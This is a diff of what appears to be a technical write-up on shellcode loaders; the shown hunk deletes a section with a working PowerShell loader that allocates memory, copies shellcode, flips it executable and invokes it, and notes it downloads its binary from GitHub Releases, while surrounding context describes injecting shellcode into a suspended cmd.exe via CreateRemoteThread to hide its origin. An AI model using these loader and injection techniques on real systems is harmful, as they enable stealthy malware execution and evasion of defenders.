@@ -212,39 +212,6 @@ CreateRemoteThread(process.handle, remote_addr)
 
 The suspended `cmd.exe` never actually runs — it's a container for the shellcode. The shellcode ends up running under `cmd.exe`'s identity in the process list, not the Python loader's. The loader can exit after injection and the shellcode keeps going.
 
-### PowerShell Loader
-
-PowerShell can't call Win32 APIs natively, so it uses P/Invoke through inline C# (`Add-Type`):
-
-```powershell
-Add-Type -TypeDefinition @'
-public static class Win32 {
-    [DllImport("kernel32.dll")]
-    public static extern IntPtr VirtualAlloc(IntPtr addr, UIntPtr size, uint type, uint protect);
-    [DllImport("kernel32.dll")]
-    public static extern bool VirtualProtect(IntPtr addr, UIntPtr size, uint prot, out uint old);
-}
-'@
-
-# Allocate RW
-$addr = [Win32]::VirtualAlloc([IntPtr]::Zero, [UIntPtr]::new($len), 0x3000, 0x04)
-
-# Copy shellcode
-[System.Runtime.InteropServices.Marshal]::Copy($shellcode, 0, $addr, $len)
-
-# Flip to RX
-[Win32]::VirtualProtect($addr, [UIntPtr]::new($len), 0x20, [ref]$old)
-
-# Execute via delegate
-$func = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
-    $addr, [type][PayloadEntry])
-$func.Invoke()
-```
-
-Same W^X pattern: allocate writable, copy, flip to executable, invoke. The `0x3000` is `MEM_COMMIT | MEM_RESERVE`, `0x04` is `PAGE_READWRITE`, `0x20` is `PAGE_EXECUTE_READ`.
-
-Architecture is auto-detected from `$env:PROCESSOR_ARCHITECTURE` — the loader downloads the matching binary from GitHub Releases.
-
 ### In-Process vs Injected Execution
 
 The two Python loader modes represent fundamentally different approaches:
